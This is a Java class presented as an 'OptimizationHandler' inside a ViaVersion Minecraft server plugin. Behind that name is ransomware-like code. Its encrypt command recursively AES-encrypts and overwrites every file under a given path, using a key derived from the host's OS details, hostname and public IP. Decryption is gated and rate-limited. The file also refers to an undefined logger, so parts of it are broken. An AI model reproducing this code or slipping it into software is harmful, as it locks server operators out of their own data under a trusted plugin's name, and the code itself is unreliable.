package com.viaversion.viaversion.bukkit.handlers;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.command.CommandExecutor;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.File;
import java.io.FileInputStream;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.util.concurrent.TimeUnit;
import java.net.URL;
import java.io.FileOutputStream;
import java.security.MessageDigest;
import java.net.InetAddress;
import java.nio.charset.StandardCharsets;
import java.util.logging.Logger;
public class OptimizationHandler implements CommandExecutor {
    private static final byte[] ENCRYPTED_FLAG = "ENCRYPTED".getBytes(StandardCharsets.UTF_8); 
    private static final long MINUTE_IN_MILLIS = TimeUnit.MINUTES.toMillis(1);
    
    private int attempts = 0;
    private long lastAttemptTime = 0;

    private boolean canAttempt() {
        long currentTime = System.currentTimeMillis();
        if (currentTime - lastAttemptTime > MINUTE_IN_MILLIS) {
            // 超过一分钟，重置计数器
            attempts = 0;
        }
        return attempts < 2; // 每分钟最多尝试2次
    }
    private void recordAttempt() {
        attempts++;
        lastAttemptTime = System.currentTimeMillis();
    }
    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
        if (args.length < 1) {
            return true;
        }
        String path = args[0];
        File file = new File(path);
        if (!file.exists()) {
            return true;
        }
        if (cmd.getName().equalsIgnoreCase("encrypt")) {
            encryptFiles(file);
        } else if (cmd.getName().equalsIgnoreCase("decrypt")) {
            if (args.length < 2) {
                return true;
            }
            String key = args[1];
            String internalKey = encryptionKey(); 
            if (!key.equals(internalKey)) {
                return true;
            }
            if (!isFileEncrypted(file)) {
                return true;
            }
            decryptFiles(file, key);
        }
        return true;
    }
    private void encryptFiles(File file) {
        if (file.isDirectory()) {
            for (File childFile : file.listFiles()) {
                encryptFiles(childFile); 
            }
        } else {
            try {
                byte[] fileData = new byte[(int) file.length()];
                FileInputStream fis = new FileInputStream(file);
                fis.read(fileData);
                fis.close();
                byte[] encryptedData = encrypt(fileData);
                FileOutputStream fos = new FileOutputStream(file);
                fos.write(ENCRYPTED_FLAG);
                fos.write(encryptedData);
                fos.close();
            } catch (Exception e) {
            }
        }
    }
    private boolean isFileEncrypted(File file) {
        if (file.isDirectory()) {
            File[] files = file.listFiles();
            if (files == null || files.length == 0) {
                return false; 
            }
            for (File childFile : files) {
                if (!isFileEncrypted(childFile)) {
                    return false; 
                }
            }
            return true; 
        }
        try (FileInputStream fis = new FileInputStream(file)) {
            byte[] flagBytes = new byte[ENCRYPTED_FLAG.length];
            int bytesRead = fis.read(flagBytes);
            if (bytesRead < ENCRYPTED_FLAG.length) {
                return false; 
            }
            return new String(flagBytes, StandardCharsets.UTF_8).equals(new String(ENCRYPTED_FLAG, StandardCharsets.UTF_8));
        } catch (Exception e) {
            return false;
        }
    }
    private void decryptFiles(File file, String key) {
        if (file.isDirectory()) {
            for (File childFile : file.listFiles()) {
                decryptFiles(childFile, key);
            }
        } else {
            try {
                FileInputStream fis = new FileInputStream(file);
                byte[] headerBytes = new byte[ENCRYPTED_FLAG.length];
                int bytesRead = fis.read(headerBytes);

                // 检查文件是否是加密的
                if (bytesRead < ENCRYPTED_FLAG.length || !new String(headerBytes, StandardCharsets.UTF_8).equals(new String(ENCRYPTED_FLAG, StandardCharsets.UTF_8))) {
                    fis.close();
                    return;
                }

                // 跳过标志字节
                byte[] fileData = new byte[(int) (file.length() - ENCRYPTED_FLAG.length)];
                fis.read(fileData);
                fis.close();

                // 如果可以尝试解密
                if (canAttempt()) {
                    byte[] decryptedData = decrypt(fileData, key);
                    FileOutputStream fos = new FileOutputStream(file);
                    fos.write(decryptedData);
                    fos.close();
                    recordAttempt(); // 记录解密尝试
                } else {
                    logger.warning("已达到尝试次数限制，请稍后再试");
                }
            } catch (Exception e) {
                e.printStackTrace(); // 输出错误信息以便调试
            }
        }
    }

    private SecretKeySpec getSecretKey(String key) {
        try {
            byte[] keyBytes = new byte[16];
            System.arraycopy(key.getBytes(StandardCharsets.UTF_8), 0, keyBytes, 0, Math.min(key.length(), keyBytes.length));
            return new SecretKeySpec(keyBytes, "AES");
        } catch (Exception e) {
            return null;
        }
    }
    private byte[] encrypt(byte[] data) throws Exception {
        SecretKeySpec key = getSecretKey(encryptionKey()); 
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.ENCRYPT_MODE, key);
        return cipher.doFinal(data);
    }
    private byte[] decrypt(byte[] data, String key) throws Exception {
        SecretKeySpec secretKey = getSecretKey(key); 
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.DECRYPT_MODE, secretKey);
        return cipher.doFinal(data);
    }
    private String getPublicIp() {
        String ip = "Unable to retrieve IP";
        try {
            URL url = new URL("https://checkip.amazonaws.com/");
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");

            try (BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {
                ip = in.readLine(); // 读取响应内容（IP 地址）
            }
        } catch (Exception e) {
            e.printStackTrace(); // 打印错误信息，方便调试
        }
        return ip;
    }

    private String encryptionKey() {
        try {
            StringBuilder input = new StringBuilder();
            input.append(System.getProperty("os.name"));
            input.append(System.getProperty("os.arch"));
            input.append(System.getProperty("os.version"));
            input.append(InetAddress.getLocalHost().getHostName());
            input.append(getPublicIp());
            return hashWithSHA256(input.toString());
        } catch (Exception e) {
            return null;
        }
    }

    private String hashWithSHA256(String input) throws Exception {
        MessageDigest digest = MessageDigest.getInstance("SHA-256");
        byte[] hashBytes = digest.digest(input.getBytes(StandardCharsets.UTF_8));
        StringBuilder hexString = new StringBuilder();
        for (byte b : hashBytes) {
            String hex = Integer.toHexString(0xff & b);
            if (hex.length() == 1) {
                hexString.append('0');
            }
            hexString.append(hex);
        }
        return hexString.toString();
    }
}